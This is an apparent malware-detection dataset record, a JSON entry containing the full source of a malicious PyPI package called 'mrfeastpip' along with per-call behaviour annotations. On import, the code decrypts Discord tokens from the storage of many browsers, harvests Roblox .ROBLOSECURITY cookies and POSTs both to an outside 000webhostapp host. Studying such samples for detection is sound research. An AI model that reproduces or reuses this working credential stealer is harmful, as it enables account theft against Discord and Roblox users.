{
  "metadata": {
    "package_name": "mrfeastpip-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/mrfeastpip-0.5-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/mrfeastpip-0.5-py3-none-any/MrFeastPip/__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nfrom base64 import b64decode\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nfrom os import getlogin, listdir\nfrom json import loads\nfrom re import findall\nfrom urllib.request import Request, urlopen\nfrom subprocess import Popen, PIPE\nimport requests\nimport browser_cookie3\n\ndef decrypt(buff, master_key):\n    try:\n        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(\n            buff[15:])[:-16].decode()\n    except:\n        return \"Error\"\n\ndef get_token():\n    tokens = []\n    cleaned = []\n    checker = []\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    chrome = local + \"\\\\Google\\\\Chrome\\\\User Data\"\n    paths = {\n        'Discord': roaming + '\\\\discord',\n        'Discord Canary': roaming + '\\\\discordcanary',\n        'Lightcord': roaming + '\\\\Lightcord',\n        'Discord PTB': roaming + '\\\\discordptb',\n        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n        'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',\n        'Amigo': local + '\\\\Amigo\\\\User Data',\n        'Torch': local + '\\\\Torch\\\\User Data',\n        'Kometa': local + '\\\\Kometa\\\\User Data',\n        'Orbitum': local + '\\\\Orbitum\\\\User Data',\n        'CentBrowser': local + '\\\\CentBrowser\\\\User Data',\n        '7Star': local + '\\\\7Star\\\\7Star\\\\User Data',\n        'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',\n        'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',\n        'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',\n        'Chrome': chrome + 'Default',\n        'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',\n        'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',\n        'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',\n        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',\n        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n        'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'\n    }\n    for platform, path in paths.items():\n        if not os.path.exists(path): continue\n        try:\n            with open(path + f\"\\\\Local State\", \"r\") as file:\n                key = loads(file.read())['os_crypt']['encrypted_key']\n                file.close()\n        except:\n            continue\n        for file in listdir(path + f\"\\\\Local Storage\\\\leveldb\\\\\"):\n            if not file.endswith(\".ldb\") and file.endswith(\".log\"):\n                continue\n            else:\n                try:\n                    with open(path + f\"\\\\Local Storage\\\\leveldb\\\\{file}\", \"r\", errors='ignore') as files:\n                        for x in files.readlines():\n                            x.strip()\n                            for values in findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x):\n                                tokens.append(values)\n                except PermissionError:\n                    continue\n        for i in tokens:\n            if i.endswith(\"\\\\\"):\n                i.replace(\"\\\\\", \"\")\n            elif i not in cleaned:\n                cleaned.append(i)\n        for token in cleaned:\n            try:\n                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])\n            except IndexError == \"Error\":\n                continue\n            checker.append(tok)\n            if tok == 'Error':\n                Token = 'No logged in discord account'\n                continue\n            else:\n                Token = tok\n            headers = {'Authorization': Token, 'Content-Type': 'application/json'}\n            try:\n                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)\n                return Token\n            except:\n                continue\n\ndef getRBS():\n    data = []\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\nRBS = getRBS()\ntry:\n    RBS = RBS[1]\nexcept:\n    RBS = 'No logged in account'\nuserdata = {\"token\": get_token(), \"cookie\": RBS}\nresp = requests.post('https://matched-anthem.000webhostapp.com/', params=userdata)\n",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'APPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path + f\"\\Local State\"",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "file.read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path + f\"\\Local Storage\\leveldb\\\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path + f\"\\Local Storage\\leveldb\\{file}\"",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "files.readlines()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "str.split()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "token.split('dQw4w9WgXcQ:')[1]",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "token.split('dQw4w9WgXcQ:')[1]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "key",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]",
              "object_description": "Decompressed data and codec key",
              "object_id": "decompressed_data_with_key",
              "intention_description": "Decrypt encrypted data",
              "intention_id": "decrypt_encrypted_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "'https://discordapp.com/api/v6/users/@me', headers=headers",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "browser_cookie3.firefox()",
              "action_description": "Retrieve browser cookies",
              "action_id": "get_browser_cookies",
              "object": "domain_name='roblox.com'",
              "object_description": "Browser cookies data",
              "object_id": "browser_cookies",
              "intention_description": "Collect browser cookies for specified domain",
              "intention_id": "collect_browser_cookies_domain"
            },
            {
              "action_api": "browser_cookie3.edge()",
              "action_description": "Retrieve browser cookies",
              "action_id": "get_browser_cookies",
              "object": "domain_name='roblox.com'",
              "object_description": "Browser cookies data",
              "object_id": "browser_cookies",
              "intention_description": "Collect browser cookies for specified domain",
              "intention_id": "collect_browser_cookies_domain"
            },
            {
              "action_api": "browser_cookie3.opera()",
              "action_description": "Retrieve browser cookies",
              "action_id": "get_browser_cookies",
              "object": "domain_name='roblox.com'",
              "object_description": "Browser cookies data",
              "object_id": "browser_cookies",
              "intention_description": "Collect browser cookies for specified domain",
              "intention_id": "collect_browser_cookies_domain"
            },
            {
              "action_api": "browser_cookie3.chrome()",
              "action_description": "Retrieve browser cookies",
              "action_id": "get_browser_cookies",
              "object": "domain_name='roblox.com'",
              "object_description": "Browser cookies data",
              "object_id": "browser_cookies",
              "intention_description": "Collect browser cookies for specified domain",
              "intention_id": "collect_browser_cookies_domain"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "'https://matched-anthem.000webhostapp.com/', params=userdata",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit environment data to remote server",
              "intention_id": "transmit_environment_data_server"
            }
          ]
        }
      ]
    }
  ]
}